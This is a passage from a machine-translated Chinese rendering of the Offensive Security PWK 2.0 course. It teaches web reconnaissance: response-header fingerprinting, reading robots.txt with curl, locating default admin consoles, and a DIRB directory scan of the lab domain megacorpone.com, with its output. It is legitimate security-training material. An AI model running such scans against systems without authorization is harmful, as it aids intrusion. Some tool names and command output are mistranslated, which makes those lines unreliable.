<div style="position:absolute;top:30985;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:30985;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">246</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:30438;left:310"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 88：使用网络工具查看请求</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以单击请求以获取有关它的更多详细信息，在本例中为响应标头： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:31063;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="27"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 27 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:31096;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:32173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:32173;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:32173;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">247</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:31675;left:293"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 89：在网络工具中查看响应头</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:31706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面显示的“服务器”标题通常至少会显示 Web 服务器软件的名称。</font></font></nobr></div>
<div style="position:absolute;top:31725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在许多默认配置中，它还显示版本号。</font></font></nobr></div>
<div style="position:absolute;top:31758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以“X-”开头的标头是非标准的 HTTP 标头。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">240个</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的名称或值往往揭示</font></font></nobr></div>
<div style="position:absolute;top:31777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关应用程序使用的技术堆栈的附加信息。</font><font style="vertical-align: inherit;">一些非</font></font></nobr></div>
<div style="position:absolute;top:31796;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准头文件包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">X-Powered-By</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x-amz-cf-id</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">X-Aspnet-Version</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">进一步研究</font></font></nobr></div>
<div style="position:absolute;top:31816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些名称可能会显示其他信息，例如“x-amz-cf-id”标头，它表明</font></font></nobr></div>
<div style="position:absolute;top:31835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该应用程序使用 Amazon CloudFront。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:31870;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.2.4 检查站点地图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:31907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 应用程序可以包含站点地图文件，以帮助搜索引擎机器人对其站点进行爬网和索引。</font></font></nobr></div>
<div style="position:absolute;top:31927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些文件还包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">抓取</font><font style="vertical-align: inherit;">哪些 URL 的指令</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这些通常是敏感页面或</font></font></nobr></div>
<div style="position:absolute;top:31946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理控制台——正是我们感兴趣的那种页面。</font></font></nobr></div>
<div style="position:absolute;top:31979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">两个最常见的站点地图文件名是 robots.txt 和 sitemap.xml。</font></font></nobr></div>
<div style="position:absolute;top:32012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">curl</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 www.google.com 检索 robots.txt 文件</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:32047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">curl https://www.google.com/robots.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:32064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户代理： *</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:32123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">240 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Mozilla，2019），https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:32251;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="28"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 28 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:32284;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:33361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:33361;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:33361;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">248</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:32380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁止：/搜索</font></font></nobr></div>
<div style="position:absolute;top:32396;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许：/search/about</font></font></nobr></div>
<div style="position:absolute;top:32413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许：/搜索/静态</font></font></nobr></div>
<div style="position:absolute;top:32430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许：/search/howsearchworks</font></font></nobr></div>
<div style="position:absolute;top:32448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁止：/sdch</font></font></nobr></div>
<div style="position:absolute;top:32464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁止：/组</font></font></nobr></div>
<div style="position:absolute;top:32481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁止：/index.html?</font></font></nobr></div>
<div style="position:absolute;top:32498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不允许： /？</font></font></nobr></div>
<div style="position:absolute;top:32515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许：/?hl=</font></font></nobr></div>
<div style="position:absolute;top:32532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:32552;left:320"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 280 - https://www.google.com/robots.txt</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:32581;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Allow</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Disallow</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是网络爬虫的指令，指示“礼貌”网络的页面或目录</font></font></nobr></div>
<div style="position:absolute;top:32600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">爬虫可能会也可能不会分别访问。</font><font style="vertical-align: inherit;">虽然列出的页面和目录在大多数</font></font></nobr></div>
<div style="position:absolute;top:32620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">案例可能并不有趣，有些甚至可能无效，不应忽视站点地图文件</font></font></nobr></div>
<div style="position:absolute;top:32639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为它们可能包含有关网站布局或其他有趣信息的线索。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:32673;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.2.5 定位管理控制台</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:32711;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 服务器通常带有远程管理 Web 应用程序或控制台，它们是</font></font></nobr></div>
<div style="position:absolute;top:32731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可通过特定 URL 访问并经常侦听特定 TCP 端口。</font></font></nobr></div>
<div style="position:absolute;top:32764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">两个常见的例子是</font><font style="vertical-align: inherit;">用于</font><i><font style="vertical-align: inherit;">Tomcat</font></i><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">manager </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">241</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序</font><font style="vertical-align: inherit;">和</font><font style="vertical-align: inherit;">用于 MySQL 的</font><i><font style="vertical-align: inherit;">phpMyAdmin </font></i><font style="font-size:8px"><font style="vertical-align: inherit;">242</font></font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"></font></font><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:32783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别托管在 /manager/html 和 /phpmyadmin 。</font></font></nobr></div>
<div style="position:absolute;top:32816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这些控制台可以限制为本地访问或可以托管在自定义 TCP 端口上，但我们</font></font></nobr></div>
<div style="position:absolute;top:32835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常会发现它们在默认配置下暴露在外部。</font><font style="vertical-align: inherit;">无论如何，作为渗透测试人员，我们</font></font></nobr></div>
<div style="position:absolute;top:32854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应检查应用服务器软件中标识的默认控制台位置</font></font></nobr></div>
<div style="position:absolute;top:32874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文档。</font><font style="vertical-align: inherit;">在下一节中，我们还将演示可用于</font></font></nobr></div>
<div style="position:absolute;top:32893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动搜索这些控制台，在后面的部分我们将演示利用</font></font></nobr></div>
<div style="position:absolute;top:32913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:32950;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3 Web 应用评估工具</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:32991;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们手动彻底探索了一个 web 应用程序，我们应该考虑使用 web</font></font></nobr></div>
<div style="position:absolute;top:33011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用评估工具来列举关于目标的更多信息。</font></font></nobr></div>
<div style="position:absolute;top:33044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有多种工具可以帮助发现和利用 Web 应用程序漏洞，</font></font></nobr></div>
<div style="position:absolute;top:33063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其中许多都预装在 Kali 中。</font><font style="vertical-align: inherit;">在本节中，我们将探索其中一些工具</font></font></nobr></div>
<div style="position:absolute;top:33082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括一些简单的浏览器扩展，在后面的部分我们将把重点转移到手动</font></font></nobr></div>
<div style="position:absolute;top:33102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞枚举和利用。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:33291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">241 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Apache 软件基金会，2019 年），https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html</font></font></font></nobr></div>
<div style="position:absolute;top:33311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">242 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(phpMyAdmin, 2019), https://www.phpmyadmin.net/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:33439;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="29"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 29 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:33472;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:34549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:34549;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:34549;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">249</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:33562;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.1.1.1</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:33612;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动化工具可以提高我们作为渗透测试人员的生产力，但我们</font></font></i></nobr></div>
<div style="position:absolute;top:33631;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还必须了解手动开发技术，因为工具并不总是</font></font></i></nobr></div>
<div style="position:absolute;top:33651;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在任何情况下都可用，手动技术提供更大的灵活性和</font></font></i></nobr></div>
<div style="position:absolute;top:33670;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定制。</font><font style="vertical-align: inherit;">请记住，工具和自动化使我们的工作更轻松。</font><font style="vertical-align: inherit;">他们不</font></font></i></nobr></div>
<div style="position:absolute;top:33689;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为我们做这项工作。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:33751;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.2 DIRB</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33790;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DIRB </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">243</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一种 Web 内容扫描器，它使用单词表通过发出以下命令来查找目录和页面</font></font></nobr></div>
<div style="position:absolute;top:33809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对服务器的请求。</font><font style="vertical-align: inherit;">DIRB 可以识别 Web 服务器上的有效网页，即使主索引</font></font></nobr></div>
<div style="position:absolute;top:33828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">页面丢失。</font></font></nobr></div>
<div style="position:absolute;top:33861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，DIRB 将识别服务器上感兴趣的目录，但它也可以自定义为</font></font></nobr></div>
<div style="position:absolute;top:33880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索特定目录、使用自定义词典、在每个目录上设置自定义 cookie 或标题</font></font></nobr></div>
<div style="position:absolute;top:33900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求，等等。</font></font></nobr></div>
<div style="position:absolute;top:33932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们在 www.megacorpone.com 上运行 DIRB。</font><font style="vertical-align: inherit;">我们将提供几个参数：要扫描的 URL，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-r</font></font></font></b></nobr></div>
<div style="position:absolute;top:33952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以非递归方式扫描，并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-z 10</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为每个请求添加 10 毫秒的延迟：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:33987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dirb http://www.megacorpone.com -r -z 10</font></font></font></b></nobr></div>
<div style="position:absolute;top:34004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:34021;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">URL_BASE：http://www.megacorpone.com/</font></font></nobr></div>
<div style="position:absolute;top:34038;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WORDLIST_FILES：/usr/share/dirb/wordlists/common.txt</font></font></nobr></div>
<div style="position:absolute;top:34055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：不递归</font></font></nobr></div>
<div style="position:absolute;top:34072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SPEED_DELAY：10 毫秒</font></font></nobr></div>
<div style="position:absolute;top:34106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------------</font></font></nobr></div>
<div style="position:absolute;top:34140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成的单词：4612    </font></font></nobr></div>
<div style="position:absolute;top:34173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- 扫描网址：http://www.megacorpone.com/ ----</font></font></nobr></div>
<div style="position:absolute;top:34191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://www.megacorpone.com/about (CODE:200|SIZE:12180)</font></font></nobr></div>
<div style="position:absolute;top:34208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://www.megacorpone.com/admin (CODE:403|SIZE:292)</font></font></nobr></div>
<div style="position:absolute;top:34225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://www.megacorpone.com/assets/  </font></font></nobr></div>
<div style="position:absolute;top:34241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://www.megacorpone.com/contact (CODE:200|SIZE:7721)  </font></font></nobr></div>
<div style="position:absolute;top:34258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://www.megacorpone.com/index (CODE:200|SIZE:12519)    </font></font></nobr></div>
<div style="position:absolute;top:34275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://www.megacorpone.com/index.html (CODE:200|SIZE:12519)  </font></font></nobr></div>
<div style="position:absolute;top:34292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://www.megacorpone.com/jobs (CODE:200|SIZE:11359)</font></font></nobr></div>
<div style="position:absolute;top:34309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://www.megacorpone.com/old-site/</font></font></nobr></div>
<div style="position:absolute;top:34326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://www.megacorpone.com/robots（代码：200|尺寸：23）</font></font></nobr></div>
<div style="position:absolute;top:34343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://www.megacorpone.com/robots.txt (CODE:200|SIZE:23)</font></font></nobr></div>
<div style="position:absolute;top:34360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://www.megacorpone.com/server-status (CODE:403|SIZE:300)   </font></font></nobr></div>
<div style="position:absolute;top:34394;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------------</font></font></nobr></div>
<div style="position:absolute;top:34411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">END_TIME：2019 年 6 月 5 日星期三 11:03:05</font></font></nobr></div>
<div style="position:absolute;top:34428;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载：4612 -</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到：9</font></font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:34499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">243 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(DIRB), http://dirb.sourceforge.net/about.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:34627;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="30"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 30 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:34660;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:35737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:35737;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:35737;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">250</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:34756;left:289"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 281 - 针对 www.megacorpone.com 运行 dirb。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:34785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据清单 281 中的输出，DIRB 发出了 4,612 个请求并报告了 URL、状态</font></font></nobr></div>
<div style="position:absolute;top:34804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码和九个不同资源的大小。</font><font style="vertical-align: inherit;">默认情况下，该工具将递归到新发现的</font></font></nobr></div>
<div style="position:absolute;top:34824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录，但在这种情况下，我们的非递归 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-r</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 扫描只是报告目录，而没有</font></font></nobr></div>
<div style="position:absolute;top:34843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下降到他们。</font><font style="vertical-align: inherit;">显然，我们可以从针对大型目标的非递归扫描开始</font></font></nobr></div>
<div style="position:absolute;top:34862;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并递归搜索感兴趣的目录，或者根据我们的情况从完全递归扫描开始</font></font></nobr></div>
<div style="position:absolute;top:34882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:34944;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DirBuster 是一个类似于 DIRB 的 Java 应用程序，它提供多线程和</font></font></i></nobr></div>
<div style="position:absolute;top:34963;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 GUI 的界面。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:35025;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3 打嗝套件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:35063;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Burp Suite </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">244</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个基于 GUI 的工具集合，面向 Web 应用程序安全测试，</font></font></nobr></div>
<div style="position:absolute;top:35083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以说是最著名的一个强大的代理工具。</font><font style="vertical-align: inherit;">而免费的社区版主要包含</font></font></nobr></div>
<div style="position:absolute;top:35102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于手动测试的工具，商业版本包括附加功能，包括</font></font></nobr></div>
<div style="position:absolute;top:35122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">强大的 Web 应用程序漏洞扫描器。</font><font style="vertical-align: inherit;">Burp Suite 具有广泛的功能列表，并且</font></font></nobr></div>
<div style="position:absolute;top:35141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值得研究，但我们将在本节中仅探讨一些基本功能。</font><font style="vertical-align: inherit;">请注意</font></font></nobr></div>
<div style="position:absolute;top:35160;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然在 OSCP 考试期间禁止 Burp Suite Professional，但也没有必要。</font></font></nobr></div>
